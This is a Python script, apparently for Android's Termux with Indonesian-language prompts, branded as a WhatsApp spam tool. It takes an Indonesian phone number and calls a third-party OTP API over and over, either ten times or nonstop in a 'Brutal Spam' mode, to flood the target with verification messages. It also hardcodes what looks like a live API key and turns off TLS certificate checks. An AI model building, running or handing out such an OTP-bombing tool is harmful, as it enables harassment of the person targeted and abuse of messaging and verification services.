import os
import sys
import time
import requests
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_KEY = "pxbr_live_co8touhm9hr4s7z0l9ikxa08"
API_BASE = "https://api.paxbar.id/api/v1/otp"

class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(f"""{C.CYAN}{C.BOLD}
╔══════════════════════════════════════════════════╗
║                                                  ║
║   ███████╗██████╗  █████╗ ███╗   ███╗            ║
║   ██╔════╝██╔══██╗██╔══██╗████╗ ████║            ║
║   ███████╗██████╔╝███████║██╔████╔██║            ║
║   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║            ║
║   ███████║██║     ██║  ██║██║ ╚═╝ ██║            ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝            ║
║                                                  ║
║            {C.GREEN}SPAM-WA TERMUX EDITION{C.CYAN}              ║
║            {C.YELLOW}Powered by PAXBAR API{C.CYAN}             ║
║            {C.MAGENTA}Developer: @SetyaFlv{C.CYAN}             ║
║            {C.MAGENTA}Powered By Setya{C.CYAN}                ║
║                                                  ║
╚══════════════════════════════════════════════════╝
{C.RESET}""")

def main_menu():
    clear()
    banner()
    print(f"""
{C.BOLD}{C.WHITE}  ╔════════════════════════════════════════════╗
  ║            {C.GREEN}📋 MAIN MENU{C.WHITE}                    ║
  ╠════════════════════════════════════════════╣
  ║                                            ║
  ║   {C.CYAN}[1]{C.WHITE}  🎯 Single Loop                       ║
  ║   {C.RED}[2]{C.WHITE}  💀 Brutal Spam                       ║
  ║   {C.YELLOW}[3]{C.WHITE}  🚪 Exit                              ║
  ║                                            ║
  ║   {C.MAGENTA}Developer: @SetyaFlv{C.WHITE}                    ║
  ║   {C.MAGENTA}Powered By Setya{C.WHITE}                       ║
  ║                                            ║
  ╚════════════════════════════════════════════╝
{C.RESET}""")

def send_otp(number):
    try:
        url = f"{API_BASE}?nomor={number}&apiKey={API_KEY}"
        r = requests.get(url, timeout=15, verify=False)
        if r.status_code == 200:
            data = r.json()
            if data.get("success") or data.get("status") == "success":
                return True, data.get("message", "OTP Sent")
            return False, data.get("message", "Unknown")
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:40]

def wait_enter():
    print(f"\n{C.YELLOW}  ⏎ Tekan ENTER untuk kembali ke halaman utama...{C.RESET}")
    input()

def single_loop():
    clear()
    banner()
    print(f"{C.BOLD}{C.CYAN}  ══════════════ 🎯 SINGLE LOOP ══════════════{C.RESET}\n")
    
    while True:
        number = input(f"{C.YELLOW}  📱 Masukkan number (wajib +62): {C.WHITE}").strip()
        if number.startswith("+62") and len(number) >= 11:
            break
        print(f"{C.RED}  ❌ Format salah! Harus +62xxx (minimal 11 digit){C.RESET}")
    
    print(f"""
{C.CYAN}  ╔══════════════════════════════════╗
  ║    {C.WHITE}⚡ PILIH KECEPATAN{C.CYAN}          ║
  ╠══════════════════════════════════╣
  ║   {C.GREEN}[1]{C.WHITE}  🐢 Pelan (10s delay)          ║
  ║   {C.YELLOW}[2]{C.WHITE}  ⚡ Rekomendasi (5s delay)     ║
  ║   {C.RED}[3]{C.WHITE}  🚀 Fast (2s delay)            ║
  ╚══════════════════════════════════╝
{C.RESET}""")
    
    while True:
        pilih = input(f"{C.YELLOW}  Silahkan pilih salah satu (1-3): {C.WHITE}").strip()
        if pilih == "1":
            delay = 10; speed_name = "PELAN"; break
        elif pilih == "2":
            delay = 5; speed_name = "REKOMENDASI"; break
        elif pilih == "3":
            delay = 2; speed_name = "FAST"; break
        print(f"{C.RED}  ❌ Pilih 1-3!{C.RESET}")
    
    clear()
    banner()
    print(f"{C.BOLD}{C.MAGENTA}  ══════════════ 🚀 PROSES SPAMMING ══════════════{C.RESET}\n")
    print(f"  {C.CYAN}📱 Target    : {C.WHITE}{number}")
    print(f"  {C.CYAN}⚡ Speed     : {C.WHITE}{speed_name} ({delay}s)")
    print(f"  {C.CYAN}🕐 Start     : {C.WHITE}{datetime.now().strftime('%H:%M:%S')}\n")
    
    total_loop = 10
    success = 0
    failed = 0
    
    for i in range(1, total_loop + 1):
        ok, msg = send_otp(number.replace("+", ""))
        if ok:
            success += 1
            icon = f"{C.GREEN}✅"
        else:
            failed += 1
            icon = f"{C.RED}❌"
        
        print(f"  {C.WHITE}[{i:02d}/{total_loop}] {icon}{C.WHITE} {msg[:40]:<40}{C.RESET}")
        
        percent = int((i / total_loop) * 100)
        filled = int((percent / 100) * 20)
        bar = "█" * filled + "░" * (20 - filled)
        print(f"  {C.CYAN}{bar} {percent}%{C.RESET}", end="\r")
        
        if i < total_loop:
            for j in range(delay, 0, -1):
                print(f"  {C.DIM}⏳ Next in {j}s...{C.RESET}                    ", end="\r")
                time.sleep(1)
    
    print(f"\n\n{C.BOLD}{C.GREEN}  ══════════════ ✅ SPAM SELESAI ══════════════{C.RESET}")
    print(f"  {C.GREEN}✅ Berhasil : {success}")
    print(f"  {C.RED}❌ Gagal    : {failed}")
    print(f"  {C.CYAN}📊 Total    : {total_loop}")
    print(f"  {C.CYAN}🕐 End      : {datetime.now().strftime('%H:%M:%S')}")
    
    wait_enter()

def brutal_spam():
    clear()
    banner()
    print(f"{C.BOLD}{C.RED}  ══════════════ 💀 BRUTAL SPAM ══════════════{C.RESET}\n")
    print(f"  {C.RED}{C.BOLD}⚠️  BRUTAL MODE AKAN JALAN NON-STOP!{C.RESET}")
    print(f"  {C.RED}⚠️  CTRL+C buat berhenti manual.{C.RESET}\n")
    
    while True:
        number = input(f"{C.YELLOW}  📱 Masukkan nomor (awalan +62): {C.WHITE}").strip()
        if number.startswith("+62") and len(number) >= 11:
            break
        print(f"{C.RED}  ❌ Format salah! Harus +62xxx (minimal 11 digit){C.RESET}")
    
    clear()
    banner()
    print(f"{C.BOLD}{C.RED}  ══════════════ 💀 PROSES SPAMMING ══════════════{C.RESET}\n")
    print(f"  {C.CYAN}📱 Target    : {C.WHITE}{number}")
    print(f"  {C.CYAN}🔥 Mode      : {C.RED}BRUTAL")
    print(f"  {C.CYAN}🕐 Start     : {C.WHITE}{datetime.now().strftime('%H:%M:%S')}\n")
    
    success = 0
    failed = 0
    i = 0
    start_time = time.time()
    
    try:
        while True:
            i += 1
            ok, msg = send_otp(number.replace("+", ""))
            if ok:
                success += 1; icon = f"{C.GREEN}✅"
            else:
                failed += 1; icon = f"{C.RED}❌"
            
            elapsed = int(time.time() - start_time)
            speed = round(i / elapsed, 1) if elapsed > 0 else 0
            
            print(f"  {C.WHITE}[{icon}{C.WHITE}] #{i:05d} | "
                  f"{C.GREEN}✓{success:<6}{C.WHITE} {C.RED}✗{failed:<6}{C.WHITE} | "
                  f"{C.CYAN}⏱{elapsed}s{C.WHITE} | "
                  f"{C.MAGENTA}⚡{speed}/s{C.RESET}")
            
            time.sleep(0.5)
    
    except KeyboardInterrupt:
        print(f"\n\n{C.BOLD}{C.RED}  ══════════════ 💀 BRUTAL STOPPED ══════════════{C.RESET}")
        print(f"  {C.GREEN}✅ Berhasil : {success}")
        print(f"  {C.RED}❌ Gagal    : {failed}")
        print(f"  {C.CYAN}📊 Total    : {i}")
        print(f"  {C.CYAN}⏱️  Durasi   : {int(time.time() - start_time)}s")
        wait_enter()

def main():
    try:
        import requests
    except ImportError:
        print(f"{C.RED}  ❌ Module 'requests' belum diinstall!{C.RESET}")
        print(f"{C.YELLOW}  Install: pip install requests urllib3{C.RESET}")
        sys.exit(1)
    
    while True:
        try:
            main_menu()
            pilih = input(f"{C.YELLOW}  ▶ Pilih menu (1-3): {C.WHITE}").strip()
            if pilih == "1":
                single_loop()
            elif pilih == "2":
                brutal_spam()
            elif pilih == "3":
                clear()
                print(f"\n{C.GREEN}  👋 Makasih cuy! Sampai jumpa!{C.RESET}\n")
                sys.exit(0)
            else:
                print(f"{C.RED}  ❌ Pilih 1-3!{C.RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{C.RED}  ⚠️  Keluar dari program...{C.RESET}\n")
            sys.exit(0)

if __name__ == "__main__":
    main()
